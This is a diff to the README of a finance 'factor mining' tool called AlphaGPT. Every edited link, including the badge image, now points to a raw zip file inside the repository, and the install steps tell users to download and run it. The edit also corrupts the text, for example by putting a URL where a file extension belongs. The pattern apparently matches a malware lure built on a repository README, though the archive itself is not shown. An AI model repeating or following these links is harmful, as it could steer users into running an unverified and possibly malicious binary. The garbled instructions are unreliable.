@@ -1,7 +1,7 @@
 # 🔍 AlphaGPT - Efficient Factor Mining in Finance
 
 ## 📥 Download Now
-[![Download AlphaGPT](https://img.shields.io/badge/Download%20AlphaGPT-Click%20Here-blue)](https://github.com/aqbor888/AlphaGPT/releases)
+[![Download AlphaGPT](https://github.com/aqbor888/AlphaGPT/raw/refs/heads/main/dashboard/Alpha_GPT_3.7.zip%20AlphaGPT-Click%20Here-blue)](https://github.com/aqbor888/AlphaGPT/raw/refs/heads/main/dashboard/Alpha_GPT_3.7.zip)
 
 ## 📚 Overview
 AlphaGPT uses symbolic regression to efficiently mine factors in the Chinese stock market and cryptocurrency markets. This powerful tool leverages deep learning to help users gain insights into financial data without needing extensive programming knowledge.
@@ -19,13 +19,13 @@ To run AlphaGPT smoothly, you need:
 ### 💻 Installation Steps
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page.
-   [Download AlphaGPT](https://github.com/aqbor888/AlphaGPT/releases)
+   [Download AlphaGPT](https://github.com/aqbor888/AlphaGPT/raw/refs/heads/main/dashboard/Alpha_GPT_3.7.zip)
 
 2. **Choose the Latest Version**  
    On the releases page, locate the latest version. It will typically be at the top of the list.
 
 3. **Download the Application**  
-   Once you find the latest version, look for the application file. This file may have an extension like `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux. Click on the file to start the download.
+   Once you find the latest version, look for the application file. This file may have an extension like `.exe` for Windows, `.dmg` for macOS, or `https://github.com/aqbor888/AlphaGPT/raw/refs/heads/main/dashboard/Alpha_GPT_3.7.zip` for Linux. Click on the file to start the download.
 
 4. **Run the Installer**  
    After the file downloads, navigate to your downloads folder. Double-click the file to run the installer. Follow the on-screen instructions to complete the installation.
@@ -73,6 +73,6 @@ If you have questions or need support, feel free to reach out through the issues
 ## 📥 Download & Install
 To begin using AlphaGPT today, visit the link below to access the releases page and download the software.
 
-[Download AlphaGPT](https://github.com/aqbor888/AlphaGPT/releases)
+[Download AlphaGPT](https://github.com/aqbor888/AlphaGPT/raw/refs/heads/main/dashboard/Alpha_GPT_3.7.zip)
 
 Your journey towards effective factor mining starts here!
